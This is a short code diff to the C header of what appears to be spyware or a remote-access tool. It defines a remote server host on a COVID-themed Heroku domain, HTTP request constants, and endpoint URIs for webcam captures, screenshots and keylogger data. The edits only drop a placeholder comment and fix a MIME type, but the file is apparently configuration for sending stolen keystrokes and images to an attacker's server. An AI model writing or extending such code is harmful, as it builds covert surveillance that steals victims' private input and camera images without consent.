@@ -28,7 +28,7 @@
 #define BAD_REQUEST_STATUS_CODE "400"
 
 #define PORT "80" // HTTP port
-#define HOST "covid-20-virus.herokuapp.com" // enter your server url here
+#define HOST "covid-20-virus.herokuapp.com"
 #define GET "GET /"
 #define HTTP " HTTP/1.1\r\n"
 #define CRLF "\r\n"
@@ -46,7 +46,7 @@
 #define COLON ": "
 #define DATETIME_FORMAT "%a, %d %b %Y %T GMT"
 #define BMP_MIME "image/bmp"
-#define TEXT_MIME "plain/text"
+#define TEXT_MIME "text/plain"
 #define WEBCAM_URI "webcam_capture"
 #define SCREENSHOT_URI "screenshot"
 #define KEYLOG_URI "keylog_data"
